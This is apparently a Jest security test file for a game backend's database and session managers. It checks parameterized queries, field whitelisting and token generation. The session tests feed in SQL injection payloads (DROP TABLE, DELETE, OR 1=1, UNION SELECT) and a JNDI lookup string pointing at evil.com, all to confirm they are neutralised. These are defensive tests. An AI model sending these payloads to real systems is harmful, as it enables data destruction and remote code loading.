/**
 * Security tests for SQL injection prevention
 */

const DatabaseManager = require('../src/db/databaseManager');
const SessionManager = require('../src/network/sessionManager');

describe('SQL Injection Prevention', () => {
    let db;
    let sessionManager;

    beforeAll(async () => {
        db = new DatabaseManager();
        await db.initialize();
        
        const mockDebugManager = {
            CONSOLE_LOGGING: false
        };
        
        sessionManager = new SessionManager({
            db: db,
            debugManager: mockDebugManager,
            gameModeManager: null
        });
        
        await sessionManager.initialize();
    });

    afterAll(async () => {
        if (sessionManager) {
            sessionManager.dispose();
        }
        if (db) {
            await db.close();
        }
    });

    describe('DatabaseManager Security', () => {
        test('should reject queries with parameter mismatch', async () => {
            const badQuery = 'SELECT * FROM users WHERE id = $1 AND name = $2';
            const params = [1]; // Missing second parameter

            await expect(db.query(badQuery, params)).rejects.toThrow('Potentially unsafe query detected');
        });

        test('should safely build parameterized queries', () => {
            const template = 'SELECT * FROM users WHERE id = :userId AND status = :status';
            const values = { userId: 1, status: 'active' };

            const { text, params } = db.buildParameterizedQuery(template, values);

            expect(text).toBe('SELECT * FROM users WHERE id = $1 AND status = $2');
            expect(params).toEqual([1, 'active']);
        });

        test('should handle missing parameters safely', () => {
            const template = 'SELECT * FROM users WHERE id = :userId';
            const values = {}; // Missing userId

            expect(() => {
                db.buildParameterizedQuery(template, values);
            }).toThrow('Missing parameter: userId');
        });

        test('should execute safe queries using safeQuery helper', async () => {
            const template = 'SELECT COUNT(*) as count FROM users WHERE socket_id = :socketId';
            const values = { socketId: 'test-socket-safe' };

            const result = await db.safeQuery(template, values);
            expect(result.rows).toBeDefined();
            expect(result.rows[0]).toHaveProperty('count');
        });
    });

    describe('SessionManager Security', () => {
        test('should safely handle malicious token input', async () => {
            const maliciousTokens = [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "admin'--",
                "' OR 1=1--",
                "'; DELETE FROM users WHERE 1=1; --",
                "UNION SELECT * FROM users--",
                "${jndi:ldap://evil.com/a}"
            ];

            for (const token of maliciousTokens) {
                const result = await sessionManager.resumeOrCreate({
                    socketId: `test-socket-${Math.random()}`,
                    ipAddress: '127.0.0.1',
                    resumeToken: token
                });

                // Should create new user, not execute injection
                expect(result.resumed).toBe(false);
                expect(result.user).toBeDefined();
                expect(result.token).toBeTruthy();
                expect(result.token).not.toBe(token); // Should generate new token
            }
        });

        test('should safely handle malicious socket ID', async () => {
            const maliciousSocketId = "'; DROP TABLE users; --";
            
            const result = await sessionManager.getBySocket(maliciousSocketId);
            
            // Should return null, not execute injection
            expect(result).toBeNull();
        });

        test('should safely update user with controlled fields', async () => {
            // First create a test user
            const testSession = await sessionManager.resumeOrCreate({
                socketId: 'test-update-socket',
                ipAddress: '127.0.0.1',
                resumeToken: null
            });

            // Test safe updates
            const safeUpdates = {
                credits: 100,
                payout_address: 'WW1234567890123456789012345678901234567890123456789012345678901234567890123456789012345',
            };

            await expect(sessionManager.updateUser(testSession.user.id, safeUpdates))
                .resolves.not.toThrow();

            // Test that dangerous fields are ignored
            const dangerousUpdates = {
                id: 999999,  // Should be ignored
                socket_id: "'; DROP TABLE users; --", // Should be ignored
                credits: 50   // Should be allowed
            };

            await expect(sessionManager.updateUser(testSession.user.id, dangerousUpdates))
                .resolves.not.toThrow();

            // Verify only safe fields were updated
            const updatedUser = await sessionManager.getBySocket('test-update-socket');
            expect(updatedUser.credits).toBe(50);
            expect(updatedUser.id).toBe(testSession.user.id); // Should not have changed
        });

        test('should generate cryptographically secure tokens', () => {
            const tokens = new Set();
            
            // Generate 100 tokens and ensure they're all unique
            for (let i = 0; i < 100; i++) {
                const token = sessionManager.generateSecureToken();
                expect(token).toBeTruthy();
                expect(typeof token).toBe('string');
                expect(token.length).toBeGreaterThan(40); // Base64url encoded 32 bytes should be 43+ chars
                expect(tokens.has(token)).toBe(false); // Should be unique
                tokens.add(token);
            }
        });
    });

    describe('Query Validation', () => {
        test('should warn about dangerous keywords in non-migration context', () => {
            const consoleSpy = jest.spyOn(console, 'warn').mockImplementation();
            
            // This should trigger a warning but not block the query
            const dangerousQuery = 'SELECT * FROM users; DROP TABLE test_table;';
            const isValid = db.queryValidator.isSafe(dangerousQuery, []);
            
            expect(isValid).toBe(true); // Still allows but warns
            expect(consoleSpy).toHaveBeenCalledWith(
                expect.stringContaining('Potentially dangerous keyword "DROP" in query')
            );
            
            consoleSpy.mockRestore();
        });

        test('should detect parameter count mismatches', () => {
            const consoleSpy = jest.spyOn(console, 'warn').mockImplementation();
            
            const isValid = db.queryValidator.isSafe('SELECT * FROM users WHERE id = $1 AND name = $2', [1]);
            
            expect(isValid).toBe(false);
            expect(consoleSpy).toHaveBeenCalledWith('⚠️ Parameter count mismatch in query');
            
            consoleSpy.mockRestore();
        });
    });
});

module.exports = {
    // Export for potential use in other test files
    createTestUser: async (db) => {
        const result = await db.query(
            'INSERT INTO users (socket_id, ip_address, anon_token) VALUES ($1, $2, $3) RETURNING *',
            ['test-socket', '127.0.0.1', 'test-token']
        );
        return result.rows[0];
    }
};